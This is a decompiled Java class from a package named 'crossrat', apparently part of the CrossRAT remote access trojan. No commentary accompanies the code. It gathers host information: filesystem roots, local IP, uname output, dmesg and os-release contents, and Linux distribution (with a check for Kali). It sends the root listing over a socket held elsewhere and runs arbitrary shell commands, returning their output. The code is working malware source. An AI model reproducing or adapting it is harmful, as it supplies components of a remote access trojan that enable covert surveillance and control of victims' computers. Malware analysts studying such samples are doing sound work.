/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import a.a.b;
import a.b.c;
import a.b.d;
import a.b.h;
import crossrat.k;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.Reader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class e {
    private static String a;

    public static void a() {
        String string = "";
        try {
            Object object = File.listRoots();
            File[] arrfile = object;
            int n = object.length;
            int n2 = 0;
            while (n2 < n) {
                object = arrfile[n2];
                string = String.valueOf(string) + object + k.e;
                ++n2;
            }
            object = new DataOutputStream(k.k.getOutputStream());
            object.writeBytes(String.valueOf(k.g) + k.d + k.y + k.d + string + k.d + "&&&");
            return;
        }
        catch (Exception exception) {
            Exception exception2 = exception;
            exception.printStackTrace();
            return;
        }
    }

    public static String b() {
        if (a == null) {
            try {
                Enumeration<NetworkInterface> enumeration = NetworkInterface.getNetworkInterfaces();
                while (enumeration.hasMoreElements()) {
                    Object object = enumeration.nextElement();
                    object = object.getInetAddresses();
                    while (object.hasMoreElements()) {
                        InetAddress inetAddress = (InetAddress)object.nextElement();
                        if (inetAddress.isLoopbackAddress() || !inetAddress.isSiteLocalAddress() || inetAddress.getHostAddress().indexOf(":") >= 0) continue;
                        a = inetAddress.getHostAddress();
                    }
                }
                if (a == null) {
                    a = "127.0.0.1";
                }
            }
            catch (SocketException socketException) {
                a = "127.0.0.1";
            }
        }
        return a;
    }

    public static List a(String[] object) {
        String string;
        ArrayList<String> arrayList = new ArrayList<String>();
        object = Runtime.getRuntime().exec((String[])object);
        object = new BufferedReader(new InputStreamReader(object.getInputStream()));
        while ((string = object.readLine()) != null) {
            arrayList.add(string);
        }
        object.close();
        return arrayList;
    }

    public static Map a(File object, String string) {
        HashMap<String, Object> hashMap = new HashMap<String, Object>();
        object = e.a((File)object);
        Iterator iterator = object.iterator();
        while (iterator.hasNext()) {
            object = (String)iterator.next();
            object = object.split(string);
            String string2 = object[0].trim();
            object = object[1].trim();
            hashMap.put(string2, object);
        }
        return hashMap;
    }

    public static List a(File object) {
        ArrayList<String> arrayList = new ArrayList<String>();
        if (object.exists()) {
            String string;
            object = new BufferedReader(new InputStreamReader(new FileInputStream((File)object)));
            while ((string = object.readLine()) != null) {
                arrayList.add(string);
            }
            object.close();
        }
        return arrayList;
    }

    public static String c() {
        String string = null;
        try {
            Object object = Runtime.getRuntime().exec(new String[]{"uname", "-a"});
            object = new BufferedReader(new InputStreamReader(object.getInputStream()));
            string = object.readLine();
            object.close();
        }
        catch (Exception exception) {
            Exception exception2 = exception;
            exception.printStackTrace();
        }
        return string;
    }

    public static b a(boolean bl) {
        Object object;
        Object object2 = null;
        try {
            object2 = e.a(new File("/var/run/dmesg.boot"));
        }
        catch (Exception exception) {
            object = exception;
            exception.printStackTrace();
        }
        if (object2 != null) {
            Iterator iterator = object2.iterator();
            while (iterator.hasNext()) {
                object = (String)iterator.next();
                object2 = b.a((String)object);
                if (object2 == null) continue;
                return object2;
            }
        }
        if (bl && (object2 = b.a((String)(object = System.getProperty("os.name")))) != null) {
            return object2;
        }
        return null;
    }

    /*
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Lifted jumps to return sites
     */
    public static d d() {
        var0 = null;
        try {
            var1_1 = null;
            var2_3 = null;
            var3_4 = false;
            var4_5 = null;
            try {
                var4_5 = e.a(new String[]{"lsb_release", "-irc"});
                var3_4 = var4_5.size() == 3;
            }
            catch (Exception v0) {
                var5_6 = v0;
                v0.printStackTrace();
            }
            var5_6 = null;
            var6_7 = null;
            try {
                var5_6 = e.a(new File("/etc/os-release"), "=");
            }
            catch (Exception v1) {
                System.out.println("Failed to load /etc/os-release");
            }
            try {
                var6_7 = e.a(new File("/etc/lsb-release"), "=");
            }
            catch (Exception v2) {
                System.out.println("Failed to load /etc/lsb-release");
            }
            var10_8 = c.values();
            var9_9 = var10_8.length;
            var8_10 = 0;
            ** GOTO lbl112
        }
        catch (Exception v3) {
            var1_2 = v3;
            v3.printStackTrace();
        }
        return new d(c.d);
lbl-1000: // 1 sources:
        {
            var7_11 = var10_8[var8_10];
            if (var0 == null && var3_4) {
                var12_13 = var4_5.iterator();
                while (var12_13.hasNext()) {
                    var11_12 = (String)var12_13.next();
                    var13_16 = var11_12.split(":");
                    var14_19 = var13_16[0].trim();
                    var11_12 = var13_16[1].trim();
                    if (var14_19.equals("Distributor ID")) {
                        var1_1 = var11_12;
                        continue;
                    }
                    if (var14_19.equals("Release")) {
                        var2_3 = var11_12;
                        if (!var11_12.toLowerCase().contains("kali")) continue;
                        var0 = c.a;
                        var2_3 = null;
                        break;
                    }
                    if (!var14_19.equals("Codename") || !var11_12.toLowerCase().contains("debian") || var1_1 == null || !var1_1.toLowerCase().contains("mint")) continue;
                    var0 = c.c;
                    break;
                }
            }
            if (var0 == null && var4_5 == null && var5_6 != null) {
                var11_12 = (String)var5_6.get("DISTRIB_ID");
                if (var1_1 == null && var11_12 != null) {
                    var1_1 = var11_12.replace("\"", "");
                }
                var12_13 = (String)var5_6.get("NAME");
                if (var11_12 == null && var12_13 != null) {
                    var1_1 = var12_13.replace("\"", "");
                }
                if ((var13_16 = (String)var5_6.get("VERSION_ID")) != null) {
                    var2_3 = var13_16.replace("\"", "");
                }
                if ((var14_19 = (String)var5_6.get("DISTRIB_RELEASE")) != null) {
                    var2_3 = var14_19.replace("\"", "");
                }
                if ((var11_12 = (String)var5_6.get("DISTRIB_CODENAME")) != null) {
                    var11_12.replace("\"", "");
                }
            }
            if (var0 == null && var6_7 != null) {
                var11_12 = (String)var5_6.get("DISTRIB_ID");
                if (var11_12 != null) {
                    var1_1 = var11_12.replace("\"", "");
                }
                if ((var12_13 = (String)var5_6.get("DISTRIB_RELEASE")) != null) {
                    var2_3 = var12_13.replace("\"", "");
                }
                if ((var13_16 = (String)var5_6.get("DISTRIB_CODENAME")) != null) {
                    var13_16.replace("\"", "");
                }
            }
            if (var0 == null) {
                if (var7_11.b().equalsIgnoreCase((String)var1_1)) {
                    var0 = var7_11;
                }
                if (var1_1 != null) {
                    var14_19 = var7_11.a();
                    var13_17 = var14_19.length;
                    var12_14 = 0;
                    while (var12_14 < var13_17) {
                        var11_12 = var14_19[var12_14];
                        if (var11_12 instanceof String && (var11_12 = (String)var11_12).toLowerCase().contains(var1_1.toLowerCase())) {
                            var0 = var7_11;
                            break;
                        }
                        ++var12_14;
                    }
                }
                var14_19 = var7_11.a();
                var13_18 = var14_19.length;
                var12_15 = 0;
                while (var12_15 < var13_18) {
                    var11_12 = var14_19[var12_15];
                    if (var11_12 instanceof h && (var11_12 = (h)var11_12).a() && var0 == null) {
                        var0 = var7_11;
                        break;
                    }
                    ++var12_15;
                }
            }
            if (var0 == c.b) {
                try {
                    var11_12 = e.a(new String[]{"nixos-version"});
                    var2_3 = (String)var11_12.get(0);
                }
                catch (Exception v4) {
                    var11_12 = v4;
                    v4.printStackTrace();
                }
            }
            if (var0 != null) {
                var11_12 = new d(var0);
                var11_12.a((String)var2_3);
                return var11_12;
            }
            ++var8_10;
lbl112: // 2 sources:
            ** while (var8_10 < var9_9)
        }
lbl113: // 1 sources:
        return new d(c.d);
    }
}
